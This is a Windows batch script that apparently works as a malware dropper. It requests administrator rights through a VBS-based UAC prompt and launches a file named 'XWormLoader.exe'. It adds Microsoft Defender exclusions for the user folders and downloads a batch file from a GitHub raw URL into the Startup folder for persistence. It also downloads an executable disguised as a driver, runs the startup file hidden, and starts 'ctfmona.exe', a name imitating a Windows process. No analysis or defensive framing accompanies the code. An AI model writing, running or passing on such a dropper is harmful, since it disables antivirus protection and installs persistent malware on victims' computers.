@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------

powershell Start-Process "XWormLoader.exe"

powershell.exe Add-MpPreference -ExclusionPath "C:\Users"
powershell.exe Add-MpPreference -ExclusionPath "%USERPROFILE%\Downloads"

powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/run.bat' -OutFile '%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runfile.bat'"
powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/Drivers.exe' -OutFile '%USERPROFILE%\DriversInitialisation.exe'"

cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

powershell Start-Process "runfile.bat" -WindowStyle Hidden

cd "%USERPROFILE%\AppData\Roaming\Microsoft"

powershell Start-Process "ctfmona.exe"